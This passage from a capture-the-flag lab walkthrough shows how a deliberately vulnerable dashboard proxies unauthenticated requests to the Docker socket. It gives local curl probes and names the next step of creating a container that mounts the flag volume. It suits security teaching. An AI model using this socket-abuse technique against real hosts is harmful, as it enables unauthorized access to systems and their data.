# Finding the Bug

Start the lab and inspect the service:

```bash
docker compose up --build -d
curl http://localhost:8080/
```

Output:
```json
{
  "service": "Docker Management Dashboard v1.0",
  "note": "Docker socket is mounted at /var/run/docker.sock",
  "endpoints": [
    "GET  /api/docker/containers/json",
    "POST /api/docker/containers/create",
    ...
  ]
}
```

The service tells you directly that it has access to the Docker socket. List the running containers:

```bash
curl http://localhost:8080/api/docker/containers/json
```

Output (abbreviated):
```json
[{"Id": "abc123...", "Image": "docker-rodeo-lab:latest", "Status": "Up 5 seconds", ...}]
```

You are talking to the Docker daemon through the app. The app forwards your request to the socket without any authorization check. You can call any Docker API endpoint, including those that create new containers.

The flag is stored in a named Docker volume (`docker-rodeo-vault`). It is not reachable from inside the running app container by any HTTP endpoint the app exposes. But you can create a new container that mounts that volume.
